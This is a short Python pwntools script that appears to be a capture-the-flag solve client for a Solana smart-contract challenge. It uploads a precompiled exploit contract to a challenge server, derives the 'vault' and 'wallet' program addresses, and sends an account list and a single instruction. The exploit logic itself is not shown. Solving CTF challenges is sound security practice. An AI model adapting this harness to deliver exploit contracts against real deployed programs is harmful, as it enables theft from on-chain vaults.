#!/usr/bin/env python3
from pwn import *
from solana import *

from solana.publickey import PublicKey

# change this
HOST, PORT = args.get("HOST", "localhost"), int(args.get("PORT", 1337))
# path to the solution contract
filename = os.path.join(os.path.dirname(os.path.abspath(__file__)), "solution/dist/solution.so")

data = b""
with open(filename, "rb") as contract:
    data = contract.read()

io = remote(HOST, PORT)

log.info("#0x0: sending smart contract")
io.sendlineafter(b"length:", str(len(data)).encode())
io.send(data)

log.info("#0x1: receiving public keys")
io.recvline()
pubkeys = dict()
for i in range(3):
    name = io.recvuntil(b" pubkey: ", drop=True).decode()
    pubkey = io.recvline().strip()
    pubkeys[name] = pubkey.decode()

# calculating pubkeys and seeds
vault_pubkey, vault_seed = PublicKey.find_program_address([b"vault"], PublicKey(pubkeys["program"]))
wallet_pubkey, wallet_seed = PublicKey.find_program_address([b"wallet"], PublicKey(pubkeys["program"]))

log.info("#0x2: sending accounts meta")
io.sendline(b"1")
io.sendline(b"rw " + pubkeys["program"].encode())

log.info("#0x3: preparing instruction")
instr = p64(0x0)
instr_len = len(instr)
io.sendline(str(instr_len).encode())
io.sendline(instr)

print(io.recvall(timeout=1).decode("utf-8"))
